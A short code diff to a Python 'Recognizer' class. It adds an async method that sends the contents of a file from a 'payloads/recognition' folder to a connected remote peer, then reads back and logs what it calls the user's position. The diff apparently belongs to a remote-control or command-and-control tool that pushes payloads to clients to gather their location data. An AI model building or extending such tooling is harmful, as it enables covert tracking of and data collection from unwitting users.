@@ -16,4 +16,13 @@ class Recognizer:
             logging.info(f"Received user infos from {writer.get_extra_info('peername')} : {message}")
             return ast.literal_eval(message)
         
+    async def get_user_position(self, reader, writer) -> dict:
+        with open("./modules/payloads/recognition/payload_get_position.py", "rb") as f:
+            writer.write(f.read())
+            await writer.drain()
+            data = await reader.read(4096)
+            message = data.decode()
+            logging.info(f"Received user position from {writer.get_extra_info('peername')} : {message}")
+            return ast.literal_eval(message)
+        
 
